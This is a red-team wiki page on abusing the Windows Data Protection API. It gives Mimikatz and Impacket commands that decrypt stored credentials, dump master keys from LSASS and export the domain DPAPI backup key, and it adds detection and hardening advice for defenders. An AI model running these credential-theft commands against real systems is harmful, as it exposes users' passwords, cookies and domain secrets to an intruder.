---
title: "DPAPI abuse"
category: "red-team"
tags: ["active-directory", "credential-access", "dpapi"]
platform: "windows"
mitre: ["T1555.004"]
difficulty: "advanced"
updated: "2026-07-12"
author: "core"
---

# DPAPI abuse

## TL;DR
The Windows Data Protection API (DPAPI) encrypts secrets for apps: browser passwords/cookies, RDP credentials, Wi-Fi keys, credential manager, and more. With a user's password/hash (or the domain backup key), an attacker can decrypt all their DPAPI-protected secrets.

## What DPAPI protects
```text
- Chromium/Edge saved passwords & cookies (session theft)
- Windows Credential Manager (cmdkey, saved RDP creds)
- Wi-Fi keys, VPN creds, scheduled task passwords
- Master keys stored in %APPDATA%\Microsoft\Protect\<SID>\
```

## Local decryption (user context)
```powershell
# Mimikatz – decrypt with the logged-on user's context
dpapi::cred /in:C:\Users\u\AppData\Local\Microsoft\Credentials\<file>
dpapi::masterkey /in:<masterkey> /rpc        # ask the DC (RPC) to help decrypt
sekurlsa::dpapi                              # extract master keys from LSASS memory
```

## Offline / with credentials
```bash
# Impacket – decrypt masterkey then a credential blob
impacket-dpapi masterkey -file <masterkey> -sid <SID> -password '<userpass>'
impacket-dpapi credential -file <cred_blob> -key 0x<decrypted_masterkey>
```

## Domain backup key (master key to all users' DPAPI)
```text
The DC holds a domain DPAPI backup key. With Domain Admin (or DCSync-level access), you can
extract it ONCE and then decrypt ANY domain user's DPAPI secrets offline, forever (until rotated).
```
```powershell
mimikatz: lsadump::backupkeys /system:dc.corp.local /export
# then: dpapi::masterkey /in:<mk> /pvk:<domain_backup.pvk>
```

## Detection (Blue Team)
- LSASS access (Sysmon 10) for `sekurlsa::dpapi`; access to Credentials/Protect folders.
- `lsadump::backupkeys` / DRSUAPI backup-key retrieval from non-DC (correlate with 4662).
- Browser credential file access by non-browser processes.

## Mitigation / Hardening
- Protect Tier 0 / limit DA (backup key = master skeleton key); rotate the domain backup key if exposed.
- Credential Guard, LSASS PPL; discourage saving passwords in browsers/credential manager.
- Monitor access to DPAPI blobs; related: [mimikatz](../tools/mimikatz.md), [dcsync](./dcsync.md).

## Sources
- [MITRE T1555.004](https://attack.mitre.org/techniques/T1555/004/) · [The Hacker Recipes – DPAPI](https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets)
